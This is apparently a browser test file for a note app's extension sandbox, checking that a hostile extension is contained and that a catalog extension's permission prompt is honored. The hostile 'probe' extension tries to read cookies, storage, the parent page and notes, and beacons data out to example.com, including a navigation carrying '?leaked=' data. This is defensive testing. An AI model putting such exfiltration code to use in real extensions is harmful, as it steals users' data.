// The sandbox, in a real browser against the real Worker (ADR 0006): a hostile workspace extension
// tries every way out, and none works. Run with `npm run test:browser` after `npm run build`; it needs
// Chrome (CHROME_PATH, or Chrome where it usually is).
import assert from "node:assert/strict";
import { test } from "node:test";
import type { Page } from "playwright-core";
import { harness, runCommand, writeFile } from "./harness.ts";

const h = harness();

/** Put a workspace extension's files in, as the signed-in person. */
async function install(page: Page, id: string, files: Record<string, string>) {
  for (const [file, text] of Object.entries(files)) await writeFile(page, `.common-ink/extensions/${id}/${file}`, text);
}

/** Install an extension from the app's catalog, in the Extensions view, as you would. */
async function installFromCatalog(page: Page, name: string) {
  await runCommand(page, "Show extensions");
  const entry = page.locator(".catalog-entry", { hasText: name });
  await entry.getByRole("button", { name: "Install" }).click();
  await page.waitForFunction((name) => [...document.querySelectorAll(".notice p")].some((p) => p.textContent?.includes(`Installed ${name}`)), name);
}

const PROBE = `export default { async activate(ctx) {
  const r = {};
  const t = async (k, f) => { try { await f(); r[k] = "reached"; } catch (e) { r[k] = "blocked"; } };
  await t("cookie", () => document.cookie);
  await t("localStorage", () => localStorage.length);
  await t("parentDocument", () => parent.document.title);
  await t("fetchApp", () => fetch("/api/files"));
  await t("fetchOut", () => fetch("https://example.com/"));
  await t("image", () => new Promise((ok, no) => { const i = new Image(); i.onload = ok; i.onerror = () => no(new Error("no")); i.src = "https://example.com/beacon.png?d=1"; }));
  await t("readNote", () => ctx.files.read("Welcome.md"));
  await t("undeclaredHost", () => ctx.net.fetch("https://example.com/?d=1"));
  ctx.commands.register("probe.run", () => {});
  await ctx.workbench.notice("PROBE " + JSON.stringify(r));
  // Last: try to leave, with data in the address.
  setTimeout(() => { location.href = "https://example.com/?leaked=" + encodeURIComponent(JSON.stringify(r)); }, 50);
} };`;

test("a sandboxed extension can't read the app's cookies, storage, page or notes, or reach the network", async () => {
  const page = await h.browser.newPage();
  // Chrome reports a request it blocks by policy too, as one that failed with "csp";
  // anything else that set out for another host left the app.
  const outside = new Map<string, string>();
  page.on("request", (req) => {
    if (!req.url().startsWith(h.base)) outside.set(req.url(), "sent");
  });
  page.on("requestfailed", (req) => {
    if (outside.has(req.url())) outside.set(req.url(), req.failure()?.errorText ?? "failed");
  });
  await page.goto(`${h.base}/`);
  await page.waitForSelector(".cm-content");
  await page.evaluate(() => localStorage.setItem("secret", "1"));
  await install(page, "probe", {
    "extension.json": JSON.stringify({ name: "Probe", activationEvents: ["onCommand:probe.run"], contributes: { commands: [{ command: "probe.run", title: "Run probe" }] } }),
    "index.js": PROBE,
  });
  await page.reload();
  await page.waitForSelector(".cm-content");
  await runCommand(page, "Run probe");
  await page.waitForFunction(() => [...document.querySelectorAll(".notice p")].some((p) => p.textContent?.includes("PROBE")));
  const said = await page.evaluate(() => [...document.querySelectorAll(".notice p")].map((p) => p.textContent).find((t) => t?.includes("PROBE"))!);
  assert.deepEqual(JSON.parse(said.slice(said.indexOf("{"))), {
    cookie: "blocked",
    localStorage: "blocked",
    parentDocument: "blocked",
    fetchApp: "blocked",
    fetchOut: "blocked",
    image: "blocked",
    readNote: "blocked",
    undeclaredHost: "blocked",
  });
  await page.waitForTimeout(500);
  assert.deepEqual(
    [...outside].filter(([, how]) => how !== "csp" && how !== "net::ERR_BLOCKED_BY_CSP"),
    [],
    "nothing left the app, not even by navigating the frame away",
  );
  assert.ok(!page.frames().some((f) => f.url().includes("example.com")), "no frame got to the other site");
  await page.waitForFunction(() => document.body.textContent?.includes("tried to navigate its frame away"), null, { timeout: 5000 }).catch(() => {});
  const records = await page.evaluate(() => fetch("/api/files").then(() => document.querySelectorAll("iframe[title='Probe (extension host)']").length));
  assert.equal(records, 0, "and its host was stopped");
  await page.close();
});

test("Word count installs from the catalog and runs at once; its sandboxed view asks before reading a note, and Don't allow is kept", async () => {
  const page = await h.browser.newPage();
  await page.goto(`${h.base}/?file=Welcome.md`);
  await page.waitForSelector(".cm-content");
  await installFromCatalog(page, "Word count");
  const files = await page.evaluate(() => fetch("/api/files").then((r) => r.json()));
  assert.deepEqual(
    (files.files ?? files).map((f: { path: string }) => f.path).filter((p: string) => p.includes("word-count")).sort(),
    [".common-ink/extensions/word-count/extension.json", ".common-ink/extensions/word-count/index.js"],
    "its files are in the workspace",
  );
  // Installed, and listed so, with no reload: a sandboxed extension goes in at once.
  await page.waitForSelector('.extension-section .extension-row[data-extension="word-count"]');
  assert.equal(await page.locator('.extension-row[data-extension="word-count"] .badge').last().textContent(), "Catalog");
  assert.equal(await page.locator(".catalog-entry", { hasText: "Word count" }).count(), 0, "it's no longer offered");
  assert.equal(await page.locator(".banner", { hasText: "apply after reload" }).count(), 0);
  await runCommand(page, "Show extensions");
  await runCommand(page, "Show word count");
  await page.waitForSelector(".dialog");
  assert.match((await page.textContent(".dialog"))!, /Word count wants to.*read your notes · Count the words in the note on show/s);
  await page.click("text=Don't allow");
  const webview = await (await page.waitForSelector("iframe.webview")).contentFrame();
  await webview!.waitForFunction(() => document.body.textContent?.includes("You didn't allow"));
  // Keeping the answer saves your settings, which Word count hears of and counts again: it isn't asked twice.
  await page.waitForTimeout(1500);
  assert.equal(await page.$(".dialog"), null, "one Don't allow is enough");
  const settings = await page.evaluate(() => fetch("/api/file?path=.common-ink%2Fusers%2Ftester%40localhost%2Fsettings.json").then((r) => r.json()));
  assert.deepEqual(JSON.parse(settings.text)["extensions.permissions"], { "word-count": { "files:read:**": "deny" } });
  await page.reload();
  await page.waitForSelector(".cm-content");
  await runCommand(page, "Show word count");
  await page.waitForTimeout(1500);
  assert.equal(await page.$(".dialog"), null, "not asked again");
  await page.close();
});
